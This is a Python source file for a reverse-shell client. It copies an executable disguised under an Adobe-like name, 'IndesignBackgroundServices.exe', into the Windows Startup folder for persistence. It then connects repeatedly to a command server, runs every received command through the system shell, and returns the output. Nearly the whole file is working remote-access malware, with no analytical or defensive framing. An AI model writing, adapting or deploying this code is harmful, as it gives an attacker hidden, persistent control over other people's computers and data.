import socket
import os
import subprocess
import time
import shutil
import sys

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 1024  # 128KB max size of messages, feel free to increase
SEPARATOR = "<sep>"

def copy_exe_to_current_user_startup():
    try:
        # Get the directory of the current script
        script_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        
        # Name of the executable file
        exe_name = "IndesignBackgroundServices.exe"
        
        # Full path to the executable
        exe_path = os.path.join(script_dir, exe_name)
        
        # Destination directory for the current user's startup folder
        startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        
        # Check if the executable already exists in the current user's startup folder
        if not os.path.exists(os.path.join(startup_folder, exe_name)):
            # Copy the executable to the current user's startup folder
            shutil.copy(exe_path, startup_folder)
            print(f"Copied '{exe_name}' to current user's startup folder.")
        else:
            print(f"'{exe_name}' is already in the current user's startup folder.")
            
    except PermissionError as e:
        print(f"Error: Permission denied. Please check permissions or run the script with appropriate privileges: {e}")
    except Exception as e:
        print(f"Error: {e}")

def connect_to_server():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_HOST, SERVER_PORT))
            return s
        except socket.error as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

def main():
    s = connect_to_server()
    cwd = os.getcwd()
    s.send(cwd.encode())

    while True:
        try:
            command = s.recv(BUFFER_SIZE).decode()
            if not command:
                raise ConnectionResetError("Server closed the connection.")
            splited_command = command.split()
            if command.lower() == "exit":
                print("Connection lost. Reconnecting...")
                s = connect_to_server()
                s.send(cwd.encode())
            if splited_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(splited_command[1:]))
                    output = ""
                except FileNotFoundError as e:
                    output = str(e)
            else:
                output = subprocess.getoutput(command)
            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        except (ConnectionResetError, BrokenPipeError):
            print("Connection lost. Reconnecting...")
            s = connect_to_server()
            s.send(cwd.encode())
        except Exception as e:
            print(f"An error occurred: {e}")
            continue

    s.close()

if __name__ == "__main__":
    copy_exe_to_current_user_startup()
    main()
